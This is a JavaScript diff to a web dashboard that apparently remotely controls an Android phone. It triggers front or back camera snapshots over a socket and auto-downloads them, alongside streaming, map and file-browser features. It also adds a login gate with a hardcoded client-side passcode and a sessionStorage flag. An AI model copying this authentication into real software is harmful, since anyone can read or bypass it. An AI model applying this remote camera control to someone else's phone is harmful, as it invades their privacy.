@@ -351,47 +351,82 @@ if (btnFullscreenCamera && cameraViewport) {
 }
 
 // ─────────────────────────────────────────────────────────────
-// Photo Snapshot Handling
+// Photo Snapshot Handling (Instant Direct Download, No Popup)
 // ─────────────────────────────────────────────────────────────
+
+function triggerShutterFeedback() {
+  if (cameraViewport) {
+    cameraViewport.style.transition = 'filter 0.08s ease';
+    cameraViewport.style.filter = 'brightness(2.2)';
+    setTimeout(() => {
+      cameraViewport.style.filter = 'none';
+      setTimeout(() => {
+        cameraViewport.style.transition = '';
+      }, 150);
+    }, 90);
+  }
+}
+
+function captureVideoFrameAndDownload() {
+  const activeVideo = (currentActiveCamera === 'front') ? videoFront : videoBack;
+  if (activeVideo && activeVideo.videoWidth > 0 && activeVideo.readyState >= 2) {
+    try {
+      const canvas = document.createElement('canvas');
+      canvas.width = activeVideo.videoWidth;
+      canvas.height = activeVideo.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(activeVideo, 0, 0, canvas.width, canvas.height);
+      const dataUrl = canvas.toDataURL('image/jpeg', 0.95);
+      
+      const fileName = `${currentActiveCamera.toUpperCase()}_snap_${Date.now()}.jpg`;
+      const a = document.createElement('a');
+      a.href = dataUrl;
+      a.download = fileName;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      
+      triggerShutterFeedback();
+      logDebug(`[PHOTO] Instant snapshot downloaded: ${fileName} (${canvas.width}x${canvas.height})`);
+      return true;
+    } catch (err) {
+      console.warn('Canvas direct capture fallback to socket:', err);
+    }
+  }
+  return false;
+}
 
 if (btnSnapActive) {
   btnSnapActive.addEventListener('click', () => {
+    // 1. If stream is actively playing in browser, capture & download instantly (0ms latency!)
+    const downloadedDirectly = captureVideoFrameAndDownload();
+    if (downloadedDirectly) {
+      return;
+    }
+
+    // 2. Otherwise if stream not running or canvas fallback, request snapshot from device
     if (!androidClientId) {
-      logDebug('Cannot take photo: Android device not connected');
+      logDebug('Cannot take photo: Android device not connected and no active stream');
       return;
     }
     const isFront = (currentActiveCamera === 'front');
-    logDebug(`[CMD] Capturing snapshot: ${isFront ? 'Front' : 'Back'} lens`);
+    logDebug(`[CMD] Capturing snapshot from device: ${isFront ? 'Front' : 'Back'} lens`);
+    triggerShutterFeedback();
     socket.emit('cmd:take_snapshot', { to: androidClientId, useFront: isFront });
   });
 }
 
+// When device sends back snapshot data, download immediately with NO popup
 socket.on('snapshot_data', data => {
-  if (data && data.snapshot) {
-    logDebug(`Received camera snapshot from: ${data.snapshot.camera}`);
-    currentSnapshotBase64 = data.snapshot.image;
-    if (snapshotPreview && snapshotModal) {
-      snapshotPreview.src = `data:image/jpeg;base64,${currentSnapshotBase64}`;
-      snapshotModal.classList.add('active');
-    }
+  if (data && data.snapshot && data.snapshot.image) {
+    logDebug(`Received camera snapshot from device (${data.snapshot.camera})`);
+    const camName = (data.snapshot.camera || currentActiveCamera || 'camera').toUpperCase();
+    const fileName = `${camName}_device_snap_${Date.now()}.jpg`;
+    downloadBase64File(data.snapshot.image, fileName);
+    logDebug(`[PHOTO] Direct download triggered: ${fileName}`);
+    triggerShutterFeedback();
   }
 });
-
-if (btnCloseSnapshot && snapshotModal) {
-  btnCloseSnapshot.addEventListener('click', () => {
-    snapshotModal.classList.remove('active');
-    if (snapshotPreview) snapshotPreview.src = '';
-    currentSnapshotBase64 = null;
-  });
-}
-
-if (btnDownloadSnapshot) {
-  btnDownloadSnapshot.addEventListener('click', () => {
-    if (currentSnapshotBase64) {
-      downloadBase64File(currentSnapshotBase64, `surveillance_snap_${Date.now()}.jpg`);
-    }
-  });
-}
 
 // ─────────────────────────────────────────────────────────────
 // File Storage Browser
@@ -950,4 +985,120 @@ if (initialHash && tabViews[initialHash]) {
   switchTab(initialHash);
 } else {
   switchTab('streaming');
+}
+
+// ─────────────────────────────────────────────────────────────
+// Security Access Control (Passcode Gateway)
+// ─────────────────────────────────────────────────────────────
+const AUTH_STORAGE_KEY = 'surveillance_auth_session';
+const PASSCODE_SECRET = 'via_cute';
+
+const loginOverlay = document.getElementById('loginOverlay');
+const loginCard = document.getElementById('loginCard');
+const loginPassInput = document.getElementById('loginPassInput');
+const btnLoginSubmit = document.getElementById('btnLoginSubmit');
+const loginErrorMsg = document.getElementById('loginErrorMsg');
+const btnTogglePassEye = document.getElementById('btnTogglePassEye');
+const eyeIconShow = document.getElementById('eyeIconShow');
+const eyeIconHide = document.getElementById('eyeIconHide');
+const btnLockSession = document.getElementById('btnLockSession');
+const btnLogout = document.getElementById('btnLogout');
+
+function isUserAuthenticated() {
+  return sessionStorage.getItem(AUTH_STORAGE_KEY) === 'unlocked';
+}
+
+function showLoginScreen() {
+  if (loginOverlay) {
+    loginOverlay.classList.remove('hidden-auth');
+    if (loginPassInput) {
+      loginPassInput.value = '';
+      setTimeout(() => {
+        loginPassInput.focus();
+      }, 250);
+    }
+  }
+  if (loginErrorMsg) {
+    loginErrorMsg.classList.remove('visible');
+  }
+}
+
+function hideLoginScreen() {
+  if (loginOverlay) {
+    loginOverlay.classList.add('hidden-auth');
+  }
+  setTimeout(() => {
+    if (map) {
+      map.invalidateSize();
+    }
+  }, 250);
+}
+
+function handleLoginAttempt() {
+  if (!loginPassInput) return;
+  const enteredPass = loginPassInput.value;
+
+  if (enteredPass === PASSCODE_SECRET) {
+    sessionStorage.setItem(AUTH_STORAGE_KEY, 'unlocked');
+    if (loginErrorMsg) loginErrorMsg.classList.remove('visible');
+    hideLoginScreen();
+  } else {
+    if (loginErrorMsg) {
+      loginErrorMsg.classList.add('visible');
+    }
+    if (loginCard) {
+      loginCard.classList.remove('shake');
+      void loginCard.offsetWidth; // Force CSS reflow to re-trigger animation
+      loginCard.classList.add('shake');
+    }
+    loginPassInput.select();
+    loginPassInput.focus();
+  }
+}
+
+if (btnLoginSubmit) {
+  btnLoginSubmit.addEventListener('click', (e) => {
+    e.preventDefault();
+    handleLoginAttempt();
+  });
+}
+
+if (loginPassInput) {
+  loginPassInput.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') {
+      e.preventDefault();
+      handleLoginAttempt();
+    }
+  });
+}
+
+if (btnTogglePassEye && loginPassInput) {
+  btnTogglePassEye.addEventListener('click', () => {
+    const isPassword = loginPassInput.type === 'password';
+    loginPassInput.type = isPassword ? 'text' : 'password';
+    if (eyeIconShow && eyeIconHide) {
+      eyeIconShow.style.display = isPassword ? 'none' : 'block';
+      eyeIconHide.style.display = isPassword ? 'block' : 'none';
+    }
+  });
+}
+
+function performLogout() {
+  sessionStorage.removeItem(AUTH_STORAGE_KEY);
+  showLoginScreen();
+}
+
+if (btnLogout) {
+  btnLogout.addEventListener('click', performLogout);
+}
+
+if (btnLockSession) {
+  btnLockSession.addEventListener('click', performLogout);
+}
+
+// Initial Authentication Gate
+if (!isUserAuthenticated()) {
+  showLoginScreen();
+} else {
+  hideLoginScreen();
 }
